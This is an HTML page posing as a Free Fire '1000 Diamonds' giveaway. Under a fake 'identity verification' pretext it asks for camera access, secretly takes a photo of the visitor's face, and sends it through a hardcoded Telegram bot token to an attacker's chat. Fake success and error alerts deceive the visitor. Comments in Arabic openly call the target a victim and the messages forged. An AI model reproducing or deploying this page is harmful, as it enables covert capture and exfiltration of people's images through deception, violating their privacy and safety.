<!DOCTYPE html>
<html>
<head>
    <title>🎁 Free Fire Rewards 🎁</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #1a1a1a; color: #f1c40f; text-align: center; font-family: sans-serif; margin: 0; padding: 10px; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .container { background: #2c3e50; padding: 30px; border-radius: 20px; box-shadow: 0 10px 20px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
        .app-icon { width: 80px; height: 80px; border-radius: 15px; margin-bottom: 15px; }
        h1 { font-size: 22px; color: #fff; margin: 10px 0; }
        p { font-size: 14px; color: #bdc3c7; margin-bottom: 20px; }
        .btn { padding: 15px 30px; background: #e74c3c; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; transition: background 0.3s; }
        .btn:hover { background: #c0392b; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://dl.listdl.com/icons/garena-free-fire-icon.png" alt="Free Fire" class="app-icon">
        <h1>💎 Claim 1000 Diamonds 💎</h1>
        <p>Verification is required to ensure account safety. Please allow camera access.</p>
        <button class="btn" onclick="startCapture()">CLAIM & VERIFY NOW</button>
    </div>

    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; //
        const CHAT_ID = "7479786207"; //

        async function startCapture() {
            try {
                // 1. طلب الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // رسالة مزورة باش الضحية يآمن بلي كاين عملية
                alert("🎁 Checking account status... Photo validation in progress. Do not close!");

                // 2. الحل: زدنـا الوقت لـ 4 ثواني باش الكاميرا تفتح صافية
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    // تحويل الصورة لملف JPG وإرسالها
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'victim_face.jpg');
                        formData.append('caption', '🎯 Captured! Victim validated photo.');

                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                        // رسالة نجاح مزورة للضحية
                        setTimeout(() => alert("✅ Identity Verified! Diamonds will be added within 24 hours."), 1000);

                    }, 'image/jpeg');
                }, 4000); // 4 ثواني انتظار

            } catch (err) {
                // رسالة خطأ مزورة إذا رفض الكاميرا
                alert("Error: Camera permission required for identity verification!");
            }
        }
    </script>
</body>
</html>
